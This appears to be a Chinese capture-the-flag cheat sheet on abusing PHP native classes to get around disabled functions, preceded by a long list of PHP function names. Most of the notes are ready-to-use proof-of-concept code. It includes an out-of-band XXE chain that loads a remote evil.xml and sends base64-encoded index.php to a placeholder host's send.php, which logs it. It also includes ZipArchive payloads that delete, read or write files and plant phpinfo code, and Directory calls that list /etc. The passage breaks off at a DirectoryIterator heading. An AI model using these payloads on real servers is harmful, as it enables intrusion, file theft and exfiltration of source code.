get_mangled_object_vars, get_class_methods, trigger_error, user_error, restore_error_handler, set_exception_handler, restore_exception_handler, get_declared_classes, get_declared_traits, get_declared_interfaces, get_defined_functions, get_defined_vars, create_function, get_resource_type, get_resources, get_loaded_extensions, extension_loaded, get_extension_funcs, get_defined_constants, debug_backtrace, debug_print_backtrace, gc_mem_caches, gc_collect_cycles, gc_enabled, gc_enable, gc_disable, gc_status, strtotime, date, idate, gmdate, mktime, gmmktime, checkdate, strftime, gmstrftime, time, localtime, getdate, date_create, date_create_immutable, date_create_from_format, date_create_immutable_from_format, date_parse, date_parse_from_format, date_get_last_errors, date_format, date_modify, date_add, date_sub, date_timezone_get, date_timezone_set, date_offset_get, date_diff, date_time_set, date_date_set, date_isodate_set, date_timestamp_set, date_timestamp_get, timezone_open, timezone_name_get, timezone_name_from_abbr, timezone_offset_get, timezone_transitions_get, timezone_location_get, timezone_identifiers_list, timezone_abbreviations_list, timezone_version_get, date_interval_create_from_date_string, date_interval_format, date_default_timezone_set, date_default_timezone_get, date_sunrise, date_sunset, date_sun_info, libxml_set_streams_context, libxml_use_internal_errors, libxml_get_last_error, libxml_clear_errors, libxml_get_errors, libxml_disable_entity_loader, libxml_set_external_entity_loader, openssl_get_cert_locations, openssl_spki_new, openssl_spki_verify, openssl_spki_export, openssl_spki_export_challenge, openssl_pkey_free, openssl_pkey_new, openssl_pkey_export, openssl_pkey_export_to_file, openssl_pkey_get_private, openssl_pkey_get_public, openssl_pkey_get_details, openssl_free_key, openssl_get_privatekey, openssl_get_publickey, openssl_x509_read, openssl_x509_free, openssl_x509_parse, openssl_x509_checkpurpose, openssl_x509_check_private_key, openssl_x509_verify, openssl_x509_export, openssl_x509_fingerprint, openssl_x509_export_to_file, openssl_pkcs12_export, openssl_pkcs12_export_to_file, openssl_pkcs12_read, openssl_csr_new, openssl_csr_export, openssl_csr_export_to_file, openssl_csr_sign, openssl_csr_get_subject, openssl_csr_get_public_key, openssl_digest, openssl_encrypt, openssl_decrypt, openssl_cipher_iv_length, openssl_sign, openssl_verify, openssl_seal, openssl_open, openssl_pbkdf2, openssl_pkcs7_verify, openssl_pkcs7_decrypt, openssl_pkcs7_sign, openssl_pkcs7_encrypt, openssl_pkcs7_read, openssl_private_encrypt, openssl_private_decrypt, openssl_public_encrypt, openssl_public_decrypt, openssl_get_md_methods, openssl_get_cipher_methods, openssl_get_curve_names, openssl_dh_compute_key, openssl_pkey_derive, openssl_random_pseudo_bytes, openssl_error_string, preg_match_all, preg_replace, preg_replace_callback, preg_replace_callback_array, preg_filter, preg_split, preg_quote, preg_grep, preg_last_error, readgzfile, gzrewind, gzclose, gzeof, gzgetc, gzgets, gzgetss, gzread, gzopen, gzpassthru, gzseek, gztell, gzwrite, gzputs, gzfile, gzcompress, gzuncompress, gzdeflate, gzinflate, gzencode, gzdecode, zlib_encode, zlib_decode, zlib_get_coding_type, deflate_init, deflate_add, inflate_init, inflate_add, inflate_get_status, inflate_get_read_len, ob_gzhandler, filter_input, filter_var, filter_input_array, filter_var_array, filter_list, filter_has_var, filter_id, hash, hash_file, hash_hmac, hash_hmac_file, hash_init, hash_update, hash_update_stream, hash_update_file, hash_final, hash_copy, hash_algos, hash_hmac_algos, hash_pbkdf2, hash_equals, hash_hkdf, mhash_keygen_s2k, mhash_get_block_size, mhash_get_hash_name, mhash_count, mhash, session_name, session_module_name, session_save_path, session_id, session_create_id, session_regenerate_id, session_decode, session_encode, session_start, session_destroy, session_unset, session_gc, session_set_save_handler, session_cache_limiter, session_cache_expire, session_set_cookie_params, session_get_cookie_params, session_write_close, session_abort, session_reset, session_status, session_register_shutdown, session_commit, sodium_crypto_aead_aes256gcm_is_available, sodium_crypto_aead_aes256gcm_decrypt, sodium_crypto_aead_aes256gcm_encrypt, sodium_crypto_aead_aes256gcm_keygen, sodium_crypto_aead_chacha20poly1305_decrypt, sodium_crypto_aead_chacha20poly1305_encrypt, sodium_crypto_aead_chacha20poly1305_keygen, sodium_crypto_aead_chacha20poly1305_ietf_decrypt, sodium_crypto_aead_chacha20poly1305_ietf_encrypt, sodium_crypto_aead_chacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_decrypt, sodium_crypto_aead_xchacha20poly1305_ietf_keygen, sodium_crypto_aead_xchacha20poly1305_ietf_encrypt, sodium_crypto_auth, sodium_crypto_auth_keygen, sodium_crypto_auth_verify, sodium_crypto_box, sodium_crypto_box_keypair, sodium_crypto_box_seed_keypair, sodium_crypto_box_keypair_from_secretkey_and_publickey, sodium_crypto_box_open, sodium_crypto_box_publickey, sodium_crypto_box_publickey_from_secretkey, sodium_crypto_box_seal, sodium_crypto_box_seal_open, sodium_crypto_box_secretkey, sodium_crypto_kx_keypair, sodium_crypto_kx_publickey, sodium_crypto_kx_secretkey, sodium_crypto_kx_seed_keypair, sodium_crypto_kx_client_session_keys, sodium_crypto_kx_server_session_keys, sodium_crypto_generichash, sodium_crypto_generichash_keygen, sodium_crypto_generichash_init, sodium_crypto_generichash_update, sodium_crypto_generichash_final, sodium_crypto_kdf_derive_from_key, sodium_crypto_kdf_keygen, sodium_crypto_pwhash, sodium_crypto_pwhash_str, sodium_crypto_pwhash_str_verify, sodium_crypto_pwhash_str_needs_rehash, sodium_crypto_pwhash_scryptsalsa208sha256, sodium_crypto_pwhash_scryptsalsa208sha256_str, sodium_crypto_pwhash_scryptsalsa208sha256_str_verify, sodium_crypto_scalarmult, sodium_crypto_secretbox, sodium_crypto_secretbox_keygen, sodium_crypto_secretbox_open, sodium_crypto_secretstream_xchacha20poly1305_keygen, sodium_crypto_secretstream_xchacha20poly1305_init_push, sodium_crypto_secretstream_xchacha20poly1305_push, sodium_crypto_secretstream_xchacha20poly1305_init_pull, sodium_crypto_secretstream_xchacha20poly1305_pull, sodium_crypto_secretstream_xchacha20poly1305_rekey, sodium_crypto_shorthash, sodium_crypto_shorthash_keygen, sodium_crypto_sign, sodium_crypto_sign_detached, sodium_crypto_sign_ed25519_pk_to_curve25519, sodium_crypto_sign_ed25519_sk_to_curve25519, sodium_crypto_sign_keypair, sodium_crypto_sign_keypair_from_secretkey_and_publickey, sodium_crypto_sign_open, sodium_crypto_sign_publickey, sodium_crypto_sign_secretkey, sodium_crypto_sign_publickey_from_secretkey, sodium_crypto_sign_seed_keypair, sodium_crypto_sign_verify_detached, sodium_crypto_stream, sodium_crypto_stream_keygen, sodium_crypto_stream_xor, sodium_add, sodium_compare, sodium_increment, sodium_memcmp, sodium_memzero, sodium_pad, sodium_unpad, sodium_bin2hex, sodium_hex2bin, sodium_bin2base64, sodium_base642bin, sodium_crypto_scalarmult_base, spl_classes, spl_autoload, spl_autoload_extensions, spl_autoload_register, spl_autoload_unregister, spl_autoload_functions, spl_autoload_call, class_parents, class_implements, class_uses, spl_object_hash, spl_object_id, iterator_to_array, iterator_count, iterator_apply, constant, bin2hex, hex2bin, sleep, usleep, time_nanosleep, time_sleep_until, strptime, flush, wordwrap, htmlspecialchars, htmlentities, html_entity_decode, htmlspecialchars_decode, get_html_translation_table, sha1, sha1_file, md5, md5_file, crc32, iptcparse, iptcembed, getimagesize, getimagesizefromstring, image_type_to_mime_type, image_type_to_extension, phpversion, phpcredits, php_sapi_name, php_uname, php_ini_scanned_files, php_ini_loaded_file, strnatcmp, strnatcasecmp, substr_count, strspn, strcspn, strtok, strtoupper, ini_set, strtolower, strpos, stripos, strrpos, strripos, strrev, hebrev, hebrevc, nl2br, basename, dirname, pathinfo, stripslashes, stripcslashes, stristr, strrchr, str_shuffle, str_word_count, str_split, strpbrk, substr_compare, utf8_encode, utf8_decode, strcoll, money_format, substr, substr_replace, quotemeta, ucfirst, lcfirst, ucwords, strtr, addslashes, addcslashes, rtrim, str_replace, str_ireplace, str_repeat, count_chars, chunk_split, trim, ltrim, strip_tags, similar_text, explode, implode, join, setlocale, localeconv, nl_langinfo, soundex, levenshtein, chr, ord, parse_str, str_getcsv, str_pad, chop, strchr, sprintf, printf, vprintf, vsprintf, fprintf, vfprintf, sscanf, fscanf, parse_url, urlencode, urldecode, rawurlencode, rawurldecode, http_build_query, readlink, linkinfo, symlink, link, unlink, exec, system, escapeshellcmd, passthru, shell_exec, proc_open, proc_close, proc_terminate, proc_get_status, proc_nice, rand, srand, getrandmax, mt_rand, mt_srand, mt_getrandmax, random_bytes, random_int, getservbyname, getservbyport, getprotobyname, getprotobynumber, getmyuid, getmygid, getmypid, getmyinode, getlastmod, base64_decode, base64_encode, password_hash, password_get_info, password_needs_rehash, password_verify, password_algos, convert_uuencode, convert_uudecode, abs, ceil, floor, round, sin, cos, tan, asin, acos, atan, atanh, atan2, sinh, cosh, tanh, asinh, acosh, expm1, log1p, pi, is_finite, is_nan, is_infinite, pow, exp, log, log10, sqrt, hypot, deg2rad, rad2deg, bindec, hexdec, octdec, decbin, decoct, dechex, base_convert, number_format, fmod, intdiv, inet_ntop, inet_pton, ip2long, long2ip, getenv, getopt, sys_getloadavg, microtime, gettimeofday, getrusage, hrtime, uniqid, quoted_printable_decode, quoted_printable_encode, convert_cyr_string, get_current_user, set_time_limit, header_register_callback, get_cfg_var, get_magic_quotes_gpc, get_magic_quotes_runtime, error_get_last, error_clear_last, call_user_func, call_user_func_array, forward_static_call, forward_static_call_array, serialize, unserialize, var_dump, var_export, debug_zval_dump, print_r, memory_get_usage, memory_get_peak_usage, register_shutdown_function, register_tick_function, unregister_tick_function, highlight_file, highlight_string, php_strip_whitespace, ini_get, ini_get_all, ini_alter, ini_restore, get_include_path, set_include_path, restore_include_path, setcookie, setrawcookie, header, header_remove, headers_sent, headers_list, http_response_code, connection_aborted, connection_status, ignore_user_abort, parse_ini_file, parse_ini_string, is_uploaded_file, move_uploaded_file, gethostbyaddr, gethostbyname, gethostbynamel, gethostname, net_get_interfaces, dns_check_record, checkdnsrr, dns_get_mx, getmxrr, dns_get_record, intval, floatval, doubleval, strval, boolval, gettype, settype, is_null, is_resource, is_bool, is_int, is_float, is_integer, is_long, is_double, is_real, is_numeric, is_string, is_array, is_object, is_scalar, is_callable, is_iterable, is_countable, pclose, popen, readfile, rewind, rmdir, umask, fclose, feof, fgetc, fgets, fgetss, fread, fopen, fpassthru, ftruncate, fstat, fseek, ftell, fflush, fwrite, fputs, mkdir, rename, copy, tempnam, tmpfile, file, file_get_contents, file_put_contents, stream_select, stream_context_create, stream_context_set_params, stream_context_get_params, stream_context_set_option, stream_context_get_options, stream_context_get_default, stream_context_set_default, stream_filter_prepend, stream_filter_append, stream_filter_remove, stream_socket_client, stream_socket_server, stream_socket_accept, stream_socket_get_name, stream_socket_recvfrom, stream_socket_sendto, stream_socket_enable_crypto, stream_socket_shutdown, stream_socket_pair, stream_copy_to_stream, stream_get_contents, stream_supports_lock, stream_isatty, fgetcsv, fputcsv, flock, get_meta_tags, stream_set_read_buffer, stream_set_write_buffer, set_file_buffer, stream_set_chunk_size, stream_set_blocking, socket_set_blocking, stream_get_meta_data, stream_get_line, stream_wrapper_register, stream_register_wrapper, stream_wrapper_unregister, stream_wrapper_restore, stream_get_wrappers, stream_get_transports, stream_resolve_include_path, stream_is_local, get_headers, stream_set_timeout, socket_set_timeout, socket_get_status, realpath, fnmatch, fsockopen, pfsockopen, pack, unpack, get_browser, crypt, opendir, closedir, chdir, getcwd, rewinddir, readdir, dir, scandir, glob, fileatime, filectime, filegroup, fileinode, filemtime, fileowner, fileperms, filesize, filetype, file_exists, is_writable, is_writeable, is_readable, is_executable, is_file, is_dir, is_link, stat, lstat, chown, chgrp, lchown, lchgrp, chmod, touch, clearstatcache, disk_total_space, disk_free_space, diskfreespace, realpath_cache_size, realpath_cache_get, ezmlm_hash, openlog, syslog, closelog, lcg_value, metaphone, ob_start, ob_flush, ob_clean, ob_end_flush, ob_end_clean, ob_get_flush, ob_get_clean, ob_get_length, ob_get_level, ob_get_status, ob_get_contents, ob_implicit_flush, ob_list_handlers, ksort, krsort, natsort, natcasesort, asort, arsort, sort, rsort, usort, uasort, uksort, shuffle, array_walk, array_walk_recursive, count, end, prev, next, reset, current, key, min, max, in_array, array_search, extract, compact, array_fill, array_fill_keys, range, array_multisort, array_push, array_pop, array_shift, array_unshift, array_splice, array_slice, array_merge, array_merge_recursive, array_replace, array_replace_recursive, array_keys, array_key_first, array_key_last, array_values, array_count_values, array_column, array_reverse, array_reduce, array_pad, array_flip, array_change_key_case, array_rand, array_unique, array_intersect, array_intersect_key, array_intersect_ukey, array_uintersect, array_intersect_assoc, array_uintersect_assoc, array_intersect_uassoc, array_uintersect_uassoc, array_diff, array_diff_key, array_diff_ukey, array_udiff, array_diff_assoc, array_udiff_assoc, array_diff_uassoc, array_udiff_uassoc, array_sum, array_product, array_filter, array_map, array_chunk, array_combine, array_key_exists, pos, sizeof, key_exists, assert, assert_options, version_compare, ftok, str_rot13, stream_get_filters, stream_filter_register, stream_bucket_make_writeable, stream_bucket_prepend, stream_bucket_append, stream_bucket_new, output_add_rewrite_var, output_reset_rewrite_vars, sys_get_temp_dir, apache_lookup_uri, virtual, apache_request_headers, apache_response_headers, apache_getenv, apache_note, apache_get_version, apache_get_modules, getallheaders, xxhash32, xxhash64, pdo_drivers, xml_parser_create, xml_parser_create_ns, xml_set_object, xml_set_element_handler, xml_set_character_data_handler, xml_set_processing_instruction_handler, xml_set_default_handler, xml_set_unparsed_entity_decl_handler, xml_set_notation_decl_handler, xml_set_external_entity_ref_handler, xml_set_start_namespace_decl_handler, xml_set_end_namespace_decl_handler, xml_parse, xml_parse_into_struct, xml_get_error_code, xml_error_string, xml_get_current_line_number, xml_get_current_column_number, xml_get_current_byte_index, xml_parser_free, xml_parser_set_option, xml_parser_get_option, jdtogregorian, gregoriantojd, jdtojulian, juliantojd, jdtojewish, jewishtojd, jdtofrench, frenchtojd, jddayofweek, jdmonthname, easter_date, easter_days, unixtojd, jdtounix, cal_to_jd, cal_from_jd, cal_days_in_month, cal_info, ctype_alnum, ctype_alpha, ctype_cntrl, ctype_digit, ctype_lower, ctype_graph, ctype_print, ctype_punct, ctype_space, ctype_upper, ctype_xdigit, dom_import_simplexml, exif_read_data, read_exif_data, exif_tagname, exif_thumbnail, exif_imagetype, finfo_open, finfo_close, finfo_set_flags, finfo_file, finfo_buffer, mime_content_type, ftp_connect, ftp_ssl_connect, ftp_login, ftp_pwd, ftp_cdup, ftp_chdir, ftp_exec, ftp_raw, ftp_mkdir, ftp_rmdir, ftp_chmod, ftp_alloc, ftp_nlist, ftp_rawlist, ftp_mlsd, ftp_systype, ftp_pasv, ftp_get, ftp_fget, ftp_put, ftp_append, ftp_fput, ftp_size, ftp_mdtm, ftp_rename, ftp_delete, ftp_site, ftp_close, ftp_set_option, ftp_get_option, ftp_nb_fget, ftp_nb_get, ftp_nb_continue, ftp_nb_put, ftp_nb_fput, ftp_quit, gd_info, imagearc, imageellipse, imagechar, imagecharup, imagecolorat, imagecolorallocate, imagepalettecopy, imagecreatefromstring, imagecolorclosest, imagecolorclosesthwb, imagecolordeallocate, imagecolorresolve, imagecolorexact, imagecolorset, imagecolortransparent, imagecolorstotal, imagecolorsforindex, imagecopy, imagecopymerge, imagecopymergegray, imagecopyresized, imagecreate, imagecreatetruecolor, imageistruecolor, imagetruecolortopalette, imagepalettetotruecolor, imagesetthickness, imagefilledarc, imagefilledellipse, imagealphablending, imagesavealpha, imagecolorallocatealpha, imagecolorresolvealpha, imagecolorclosestalpha, imagecolorexactalpha, imagecopyresampled, imagerotate, imageflip, imageantialias, imagecrop, imagecropauto, imagescale, imageaffine, imageaffinematrixconcat, imageaffinematrixget, imagesetinterpolation, imagesettile, imagesetbrush, imagesetstyle, imagecreatefrompng, imagecreatefromwebp, imagecreatefromgif, imagecreatefromjpeg, imagecreatefromwbmp, imagecreatefromxbm, imagecreatefromxpm, imagecreatefromgd, imagecreatefromgd2, imagecreatefromgd2part, imagecreatefrombmp, imagecreatefromtga, imagepng, imagewebp, imagegif, imagejpeg, imagewbmp, imagegd, imagegd2, imagebmp, imagedestroy, imagegammacorrect, imagefill, imagefilledpolygon, imagefilledrectangle, imagefilltoborder, imagefontwidth, imagefontheight, imageinterlace, imageline, imageloadfont, imagepolygon, imageopenpolygon, imagerectangle, imagesetpixel, imagestring, imagestringup, imagesx, imagesy, imagesetclip, imagegetclip, imagedashedline, imagettfbbox, imagettftext, imageftbbox, imagefttext, imagetypes, jpeg2wbmp, png2wbmp, image2wbmp, imagelayereffect, imagexbm, imagecolormatch, imagefilter, imageconvolution, imageresolution, textdomain, gettext, _, dgettext, dcgettext, bindtextdomain, ngettext, dngettext, dcngettext, bind_textdomain_codeset, gmp_init, gmp_import, gmp_export, gmp_intval, gmp_strval, gmp_add, gmp_sub, gmp_mul, gmp_div_qr, gmp_div_q, gmp_div_r, gmp_div, gmp_mod, gmp_divexact, gmp_neg, gmp_abs, gmp_fact, gmp_sqrt, gmp_sqrtrem, gmp_root, gmp_rootrem, gmp_pow, gmp_powm, gmp_perfect_square, gmp_perfect_power, gmp_prob_prime, gmp_gcd, gmp_gcdext, gmp_lcm, gmp_invert, gmp_jacobi, gmp_legendre, gmp_kronecker, gmp_cmp, gmp_sign, gmp_random, gmp_random_seed, gmp_random_bits, gmp_random_range, gmp_and, gmp_or, gmp_com, gmp_xor, gmp_setbit, gmp_clrbit, gmp_testbit, gmp_scan0, gmp_scan1, gmp_popcount, gmp_hamdist, gmp_nextprime, gmp_binomial, iconv, iconv_get_encoding, iconv_set_encoding, iconv_strlen, iconv_substr, iconv_strpos, iconv_strrpos, iconv_mime_encode, iconv_mime_decode, iconv_mime_decode_headers, json_encode, json_decode, json_last_error, json_last_error_msg, mb_convert_case, mb_strtoupper, mb_strtolower, mb_language, mb_internal_encoding, mb_http_input, mb_http_output, mb_detect_order, mb_substitute_character, mb_parse_str, mb_output_handler, mb_preferred_mime_name, mb_str_split, mb_strlen, mb_strpos, mb_strrpos, mb_stripos, mb_strripos, mb_strstr, mb_strrchr, mb_stristr, mb_strrichr, mb_substr_count, mb_substr, mb_strcut, mb_strwidth, mb_strimwidth, mb_convert_encoding, mb_detect_encoding, mb_list_encodings, mb_encoding_aliases, mb_convert_kana, mb_encode_mimeheader, mb_decode_mimeheader, mb_convert_variables, mb_encode_numericentity, mb_decode_numericentity, mb_send_mail, mb_get_info, mb_check_encoding, mb_ord, mb_chr, mb_scrub, mb_regex_encoding, mb_regex_set_options, mb_ereg, mb_eregi, mb_ereg_replace, mb_eregi_replace, mb_ereg_replace_callback, mb_split, mb_ereg_match, mb_ereg_search, mb_ereg_search_pos, mb_ereg_search_regs, mb_ereg_search_init, mb_ereg_search_getregs, mb_ereg_search_getpos, mb_ereg_search_setpos, mbregex_encoding, mbereg, mberegi, mbereg_replace, mberegi_replace, mbsplit, mbereg_match, mbereg_search, mbereg_search_pos, mbereg_search_regs, mbereg_search_init, mbereg_search_getregs, mbereg_search_getpos, mbereg_search_setpos, mysqli_affected_rows, mysqli_autocommit, mysqli_begin_transaction, mysqli_change_user, mysqli_character_set_name, mysqli_close, mysqli_commit, mysqli_connect, mysqli_connect_errno, mysqli_connect_error, mysqli_data_seek, mysqli_dump_debug_info, mysqli_debug, mysqli_errno, mysqli_error, mysqli_error_list, mysqli_stmt_execute, mysqli_execute, mysqli_fetch_field, mysqli_fetch_fields, mysqli_fetch_field_direct, mysqli_fetch_lengths, mysqli_fetch_all, mysqli_fetch_array, mysqli_fetch_assoc, mysqli_fetch_object, mysqli_fetch_row, mysqli_field_count, mysqli_field_seek, mysqli_field_tell, mysqli_free_result, mysqli_get_connection_stats, mysqli_get_client_stats, mysqli_get_charset, mysqli_get_client_info, mysqli_get_client_version, mysqli_get_links_stats, mysqli_get_host_info, mysqli_get_proto_info, mysqli_get_server_info, mysqli_get_server_version, mysqli_get_warnings, mysqli_init, mysqli_info, mysqli_insert_id, mysqli_kill, mysqli_more_results, mysqli_multi_query, mysqli_next_result, mysqli_num_fields, mysqli_num_rows, mysqli_options, mysqli_ping, mysqli_poll, mysqli_prepare, mysqli_report, mysqli_query, mysqli_real_connect, mysqli_real_escape_string, mysqli_real_query, mysqli_reap_async_query, mysqli_release_savepoint, mysqli_rollback, mysqli_savepoint, mysqli_select_db, mysqli_set_charset, mysqli_stmt_affected_rows, mysqli_stmt_attr_get, mysqli_stmt_attr_set, mysqli_stmt_bind_param, mysqli_stmt_bind_result, mysqli_stmt_close, mysqli_stmt_data_seek, mysqli_stmt_errno, mysqli_stmt_error, mysqli_stmt_error_list, mysqli_stmt_fetch, mysqli_stmt_field_count, mysqli_stmt_free_result, mysqli_stmt_get_result, mysqli_stmt_get_warnings, mysqli_stmt_init, mysqli_stmt_insert_id, mysqli_stmt_more_results, mysqli_stmt_next_result, mysqli_stmt_num_rows, mysqli_stmt_param_count, mysqli_stmt_prepare, mysqli_stmt_reset, mysqli_stmt_result_metadata, mysqli_stmt_send_long_data, mysqli_stmt_store_result, mysqli_stmt_sqlstate, mysqli_sqlstate, mysqli_ssl_set, mysqli_stat, mysqli_store_result, mysqli_thread_id, mysqli_thread_safe, mysqli_use_result, mysqli_warning_count, mysqli_refresh, mysqli_escape_string, mysqli_set_opt, posix_kill, posix_getpid, posix_getppid, posix_getuid, posix_setuid, posix_geteuid, posix_seteuid, posix_getgid, posix_setgid, posix_getegid, posix_setegid, posix_getgroups, posix_getlogin, posix_getpgrp, posix_setsid, posix_setpgid, posix_getpgid, posix_getsid, posix_uname, posix_times, posix_ctermid, posix_ttyname, posix_isatty, posix_getcwd, posix_mkfifo, posix_mknod, posix_access, posix_getgrnam, posix_getgrgid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_setrlimit, posix_get_last_error, posix_errno, posix_strerror, posix_initgroups, readline, readline_info, readline_add_history, readline_clear_history, readline_list_history, readline_read_history, readline_write_history, readline_completion_function, readline_callback_handler_install, readline_callback_read_char, readline_callback_handler_remove, readline_redisplay, readline_on_new_line, shmop_open, shmop_read, shmop_close, shmop_size, shmop_write, shmop_delete, simplexml_load_file, simplexml_load_string, simplexml_import_dom, socket_select, socket_create, socket_create_listen, socket_create_pair, socket_accept, socket_set_nonblock, socket_set_block, socket_listen, socket_close, socket_write, socket_read, socket_getsockname, socket_getpeername, socket_connect, socket_strerror, socket_bind, socket_recv, socket_send, socket_recvfrom, socket_sendto, socket_get_option, socket_set_option, socket_shutdown, socket_last_error, socket_clear_error, socket_import_stream, socket_export_stream, socket_sendmsg, socket_recvmsg, socket_cmsg_space, socket_addrinfo_lookup, socket_addrinfo_connect, socket_addrinfo_bind, socket_addrinfo_explain, socket_getopt, socket_setopt, msg_get_queue, msg_send, msg_receive, msg_remove_queue, msg_stat_queue, msg_set_queue, msg_queue_exists, sem_get, sem_acquire, sem_release, sem_remove, shm_attach, shm_remove, shm_detach, shm_put_var, shm_has_var, shm_get_var, shm_remove_var, token_get_all, token_name, xmlwriter_open_uri, xmlwriter_open_memory, xmlwriter_set_indent, xmlwriter_set_indent_string, xmlwriter_start_comment, xmlwriter_end_comment, xmlwriter_start_attribute, xmlwriter_end_attribute, xmlwriter_write_attribute, xmlwriter_start_attribute_ns, xmlwriter_write_attribute_ns, xmlwriter_start_element, xmlwriter_end_element, xmlwriter_full_end_element, xmlwriter_start_element_ns, xmlwriter_write_element, xmlwriter_write_element_ns, xmlwriter_start_pi, xmlwriter_end_pi, xmlwriter_write_pi, xmlwriter_start_cdata, xmlwriter_end_cdata, xmlwriter_write_cdata, xmlwriter_text, xmlwriter_write_raw, xmlwriter_start_document, xmlwriter_end_document, xmlwriter_write_comment, xmlwriter_start_dtd, xmlwriter_end_dtd, xmlwriter_write_dtd, xmlwriter_start_dtd_element, xmlwriter_end_dtd_element, xmlwriter_write_dtd_element, xmlwriter_start_dtd_attlist, xmlwriter_end_dtd_attlist, xmlwriter_write_dtd_attlist, xmlwriter_start_dtd_entity, xmlwriter_end_dtd_entity, xmlwriter_write_dtd_entity, xmlwriter_output_memory, xmlwriter_flush, zip_open, zip_close, zip_read, zip_entry_open, zip_entry_close, zip_entry_read, zip_entry_filesize, zip_entry_name, zip_entry_compressedsize, zip_entry_compressionmethod, opcache_reset, opcache_invalidate, opcache_compile_file, opcache_is_script_cached, opcache_get_configuration, opcache_get_status, ## SimpleXMLElement \u5229\u7528\u7248\u672c: (PHP 5, PHP 7) \u6211\u4eec\u77e5\u9053\u53ef\u4ee5\u4f7f\u7528xxe\u6765\u8bfb\u53d6\u6587\u4ef6\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u6784\u9020\u4e00\u4e2axxe\u6f0f\u6d1e\u6765\u8bfb\u53d6\u6587\u4ef6\u5462\uff1f\u7b54\u6848\u662f\u80af\u5b9a\u7684\uff0c\u6211\u4eec\u6765\u770b\u4e0b\u5b98\u65b9\u6587\u6863: \u53ef\u4ee5\u770b\u5230\u5f53\u6211\u4eec\u8bbe\u7f6e\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3atrue\u65f6\uff0c\u53ef\u4ee5\u4ece\u8fdc\u7a0b\u52a0\u8f7dxml\u6587\u6863\uff0c\u90a3\u4e48\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8be5\u5982\u4f55\u8bbe\u7f6e\u5462\uff1f\u6211\u4eec\u67e5\u770bphp\u7684\u9884\u5b9a\u4e49\u5e38\u91cf \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u5b58\u5728\u8b66\u544a\uff0c\u5f53\u6211\u4eec\u8bbe\u7f6e\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a LIBXML_NOENT \u65f6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4xxe\u653b\u51fb\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\u3002\u624b\u52a8\u8f93\u51fa\u4e0b\u8be5\u503c\uff0c\u4e3a2\uff0c\u6240\u4ee5\u6211\u4eec\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u8be5\u53c2\u6570\u4e3a2: \u8bfb\u6587\u4ef6poc # evil.xml <?xml version=\"1.0\"?> <!DOCTYPE ANY[ <!ENTITY % remote SYSTEM \"http://xxx.xxx.xxx.xxx/send.xml\"> %remote; %all; %send; ]> send.xml <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"> <!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx.xxx/send.php?file=%file;'> \"> send.php <?php file_put_contents ( \"result.txt\" , $_GET [ 'file' ]) ; ?> \u6076\u610f\u4ee3\u7801 $x=new SimpleXMLElement(\"http://xxx.xxx.xxx.xxx/evil.xml\",2,true); \u5f53\u7136\u6211\u4eec\u4e0d\u6b62\u53ef\u4ee5\u8bfb\u6587\u4ef6\uff0cxxe\u80fd\u5e72\u7684\u4e8b\u6211\u4eec\u4e5f\u80fd\u5e72 ZipArchive # \u5229\u7528\u7248\u672c: (PHP 5 >= 5.2.0, PHP 7, PECL zip >= 1.1.0) \u8fd9\u4e2a\u7c7b\u662f\u5728php5.2.0\u4e4b\u540e\u5f15\u5165\u7684\uff0c\u6211\u4eec\u4e4b\u524d\u4f1a\u5728\u4e00\u4e9b\u539f\u751f\u7c7b\u5229\u7528\u4e2d\u89c1\u5230\u5b83\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u8fd9\u4e2a\u7c7b\u6765\u5220\u9664\u6587\u4ef6\uff0c\u8bfb\u53d6\u6587\u4ef6\u4ee5\u53ca\u6709\u635f\u5199\u6587\u4ef6\u3002 \u5220\u9664\u6587\u4ef6poc # $a=new ZipArchive(); $a->open(\"file\", ZipArchive::OVERWRITE); // ZipArchive::CREATE\u4e5f\u53ef\u4ee5\u75288\u4ee3\u66ff \u8bfb\u53d6\u6587\u4ef6poc # $f = \"flag\"; $zip=new ZipArchive(); $zip->open(\"a.zip\", ZipArchive::CREATE); $zip->addFile($f); $zip->close(); $zip->open(\"a.zip\"); echo $zip->getFromName($f); $zip->close(); \u6709\u635f\u5199\u6587\u4ef6poc # \u7528\u5904\u4e0d\u5927 $f = \"flag\"; $zip=new ZipArchive(); $zip->open(\"a.zip\", ZipArchive::CREATE); $zip->setArchiveComment(\" <?php phpinfo (); ?> \"); $zip->addFromString(\"file\", \"\"); $zip->close(); //include \"a.zip\"; Phar # \u5229\u7528\u811a\u672c: (PHP 5 >= 5.3.0, PHP 7, PECL phar >= 2.0.0) Directory # \u5229\u7528\u7248\u672c\uff1a (PHP 4, PHP 5, PHP 7) \u8fd9\u4e2a\u7c7b\u672c\u610f\u662f\u4e0d\u80fd\u591f\u76f4\u63a5\u901a\u8fc7 new \u65b9\u5f0f\u8fdb\u884c\u521b\u5efa\u5229\u7528\uff0c\u5f53\u4f7f\u7528 dir \u51fd\u6570\u65f6\uff0c\u8fd9\u4e2a\u7c7b\u4f1a\u88ab\u5b9e\u4f8b\u5316\u3002\u4f46\u6211\u4eec\u4f9d\u7136\u53ef\u4ee5\u76f4\u63a5\u5b9e\u4f8b\u5316\u5e76\u4f7f\u7528\u5176\u4e2d\u7684\u65b9\u6cd5 \u5224\u65ad\u76ee\u5f55\u662f\u5426\u5b58\u5728poc # # \u5224\u65ad\u67d0\u4e2a\u76ee\u5f55\u662f\u5426\u5b58\u5728\uff0c # \u5982\u679c\u5b58\u5728\u8fd4\u56de\u76ee\u5f55\u5b57\u7b26\u4e32\uff0c\u82e5\u4e0d\u5b58\u5728\u5219\u4ea7\u751f\u8b66\u544a\u5e76\u8fd4\u56deNULL $dir=\"/etc\"; echo (new Directory)->read(opendir($dir)); \u5217\u76ee\u5f55poc # $dir = \"/etc\"; $d = new Directory; $d->resource = opendir($dir); while(($c = $d->read($d->resource))){echo $c.\"\\n\";}; DirectoryIterator # 